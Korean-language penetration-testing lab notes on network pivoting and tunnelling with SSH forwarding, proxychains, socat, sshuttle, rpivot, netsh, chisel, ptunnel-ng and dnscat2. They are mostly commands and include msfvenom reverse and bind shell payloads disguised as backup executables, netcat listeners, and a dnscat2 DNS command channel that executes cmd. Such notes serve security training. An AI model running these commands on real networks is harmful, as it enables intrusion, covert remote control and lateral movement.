- `/etc/proxychains4.conf`에서 socks5로 작동을 안할시에 socks4로 바꿔서 실행해볼 것.
```bash
netstat -r
```
- Pivoting을 할 때 route table를 확인해야한다.
- route table에서 호스트를 찾을 수 없으면 default gateway로 패킷을 전송.

```bash
# lhost:1234 > rhost:3306
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

nmap -v -sV -p1234 localhost
```

```bash
ssh -D 1080 ubuntu@10.129.202.64

# cat /etc/proxychains.conf
socks5 	127.0.0.1 1080

proxychains nmap -v -sn 172.16.5.1-200

proxychains nmap -v -Pn -sT 172.16.5.19

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
```bash
msfvenom -p windows/x64/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# rhost:8080 > lhost:8000
ssh -R <InternalIPofPivotHost>:8080:localhost:8000 ubuntu@<ipAddressofTarget> -vN
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

nc -nvlp 8000
```
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
```bash
# rhost:8080 > lhost:80
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- ssh가 사용되고 있지 않을 때 사용 가능함.

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# bind shell
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

## Windows Plink
```powershell
plink -ssh -D 9050 ubuntu@10.129.15.50
```

## sshuttle
```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

## Rpivot
```bash
git clone https://github.com/klsecservices/rpivot

python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

python2.7 client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

proxychains firefox-esr 172.16.5.135:80
```

## Netsh.exe
```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

netsh.exe interface portproxy show v4tov4
```
```bash
xfreerdp3 /v:10.129.15.150:8080 /u:victor /p:pass@123
```
- netsh.exe는 windows 내장 프로그램임.

## DNS proxy
```bash
git clone https://github.com/iagox86/dnscat2.git
git clone https://github.com/lukebaggett/dnscat2-powershell.git

sudo ruby dnscat2.rb --dns host=0.0.0.0,port=53,domain=inlanefreight.local --no-cache
```
<img width="1100" height="170" alt="image" src="https://github.com/user-attachments/assets/5aaf8b24-e096-45c1-bb4f-b0d441bc7e92" />

```powershell
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```
```bash
dnscat2> window -i 1
```

## chisel
```bash
sudo ./chisel server -v -p 1234 --socks5

./chisel client -v 10.129.202.64:1234 socks

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
```bash
# 일반적으로 Reverse로 연결해서 사용
sudo ./chisel server --reverse -v -p 1234 --socks5

./chisel client -v 10.10.14.17:1234 R:socks

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## Ptunnel-ng
```bash
git clone https://github.com/utoni/ptunnel-ng.git

# lhost
sudo ./autogen.sh

scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# rhost
sudo ./ptunnel-ng -r10.129.202.64 -R22

# lhost
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

ssh -p2222 -lubuntu 127.0.0.1

ssh -D 9050 -p2222 -lubuntu 127.0.0.1

proxychains nmap -sV -sT 172.16.5.19 -p3389
```
